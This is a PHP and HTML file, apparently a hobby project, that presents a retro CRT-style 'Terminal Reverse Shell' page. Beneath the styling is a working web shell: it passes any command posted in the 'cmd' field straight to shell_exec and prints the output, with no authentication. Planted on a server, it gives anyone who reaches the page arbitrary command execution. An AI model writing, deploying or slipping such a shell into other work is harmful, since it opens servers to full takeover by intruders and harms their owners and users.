

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRS</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet"> 
</head>
<style>

    
    #screen{
        position: relative;
        width: 700px;
        height: 400px;
        background-color: green;
        border-radius: 0.7rem;
    }

    #scan, #bezel{
        position: absolute;
        width: 100%;
        height: 100%;
        top:0;
        left: 0;
        pointer-events: none;
    }

    #scan {
        opacity: 70%;
        border-radius: 0.7rem;
    }

    #bezel{
        border: 5px groove grey;
        border-radius: 0.7rem;
    }

    #content{
        font-family: VT323;
        color: rgb(159, 248, 25);
        padding: 50px;
        font-size: 20px;
        text-shadow: 1px 1px 2px rgb(150, 167, 124), 0 0 1em rgb(150, 167, 124), 0 0 0.2em rgb(150, 167, 124);
        overflow: hidden;
        overflow-y: scroll;
    }

    #textbox{
        border: none;
        outline: none;
        margin: 0;
        padding: 0;
        background-color: transparent;
        color: rgb(159, 248, 25);
        width: 150px;
        
    }

    #scrolling{
        overflow: hidden;
        overflow-y: scroll;
        width: 100%;
        height: 100%;
    }

    #woodCasing {
        position:  absolute;
        padding: 5px;
    }

    .woodImg{
        width: 770px;
        height: 470px;
        border-radius: 1rem;
    }

    body {
        background: #000;
    }

  #container {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 10%;
  }

  #title{
    font-family: VT323;
        color: rgb(159, 248, 25);
        padding: 5px;
        font-size: 30px;
        text-shadow: 1px 1px 2px rgb(150, 167, 124), 0 0 1em rgb(150, 167, 124), 0 0 0.2em rgb(150, 167, 124);
  }

  pre {
    font-size: 10px;
  }
    
</style>
<body>
    <div id='title'>
    <h3>TRS</h3>
    <p>(Terminal Reverse Shell)</p>
    </div>
    
    <div id='container'>

    <div id='woodCasing'><img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/wood.jpg" alt="" class='woodImg'></div>
    <div id='screen'>
        <img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/scanlines.png" alt="" id='scan'>
        <img src="https://raw.githubusercontent.com/Ento9/TerminalImg/main/bezel.png" alt="" id='bezel'>
            <div id='scrolling'>
            <div id='content'>
            <?php

if(isset($_POST['cmd'])) 
{
    $cmd = $_POST['cmd'];

    $result = shell_exec($cmd);

    echo "<pre>".$result."</pre>"."<br>";
}

?>

    <form action="" method='post'>

<p>
-----Command:------------<br>
 > $ <input type="text" name='cmd' id='textbox'>

    </p>


</form>
            </div>
        </div>

    </div>
    

    </div>
    
    
    
</body>
<script>
    document.getElementById('cmd').addEventListener('submit', function(event) {
        if (event.keyCode == 13) {
            event.preventDefault();
        }
    });
</script>
</html>